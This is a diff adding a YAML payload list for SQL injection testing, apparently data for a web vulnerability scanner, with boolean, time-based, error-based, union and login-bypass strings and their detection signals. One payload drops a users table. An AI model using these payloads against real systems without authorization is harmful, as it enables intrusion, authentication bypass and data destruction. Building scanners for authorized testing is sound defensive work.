@@ -1,0 +1,21 @@
+category: sql_injection
+description: "Payloads SQLi pour attaques boolean, time-based, error-based et union"
+payloads:
+  - value: "' OR '1'='1"
+    type: boolean
+    detect: ["200", "length_change"]
+  - value: "1; DROP TABLE users--"
+    type: error
+    detect: ["error_message", "500"]
+  - value: "1' AND SLEEP(5)--"
+    type: time_based
+    detect: ["delay_gt_4000ms"]
+  - value: "' UNION SELECT null,null,null--"
+    type: union
+    detect: ["extra_columns"]
+  - value: "admin'--"
+    type: bypass
+    detect: ["200", "auth_bypass"]
+  - value: "1' OR 1=1--"
+    type: boolean
+    detect: ["200", "length_change"]
